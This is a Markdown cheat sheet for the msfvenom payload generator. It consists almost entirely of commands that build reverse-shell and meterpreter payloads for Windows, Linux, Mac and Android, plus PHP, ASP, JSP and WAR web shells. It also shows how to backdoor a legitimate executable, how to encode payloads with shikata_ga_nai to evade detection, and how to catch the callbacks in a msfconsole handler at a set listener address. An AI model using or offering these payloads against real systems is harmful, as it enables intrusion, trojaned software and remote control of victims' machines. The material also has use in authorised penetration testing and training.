# MSFVenom

MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.

## Creating Binaries
The following create different binaries for meterpreter and reverse TCP shells:

### Creates a Reverse TCP Meterpreter Shell - Payload for Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f exe -o payload.exe
```

### Creates a simple HTTP Payload for Windows
```
msfvenom -p windows/meterpreter/reverse_http LHOST={HOST/IP} LPORT={PORT} -f exe -o payload.exe
```

### Creates a simple TCP Shell for Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f elf -o payload.elf
```

### Creates a simple TCP Shell for Mac

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f macho -o example.macho
```

### Creates a simple TCP Payload for Android

```
msfvenom -p android/meterpreter/reverse/tcp LHOST={HOST/IP} LPORT={PORT} R -o example.apk
```

## Web Payloads

### Creates a Simple TCP Shell for PHP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f raw -o example.php
```

### Creates a Simple TCP Shell for ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f asp -o example.asp
```

### Creates a Simple TCP Shell for Javascrip
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f raw -o example.jsp
```

### Creates a Simple TCP Shell for WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f war -o example.war
```

## Windows Payloads

### Lists all avalaible encoder
```
msfvenom -l encoders
```

### Binds an exe with a Payload (Backdoors an exe)
```
msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f exe -o example.exe
```

### Creates a simple TCP payload with shikata_ga_nai encoder
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o example.exe
```

### Binds an exe with a Payload and encodes it
```
msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o example.exe
```

## Getting a Metepreter Shell
```
kali@kali:~$ sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
```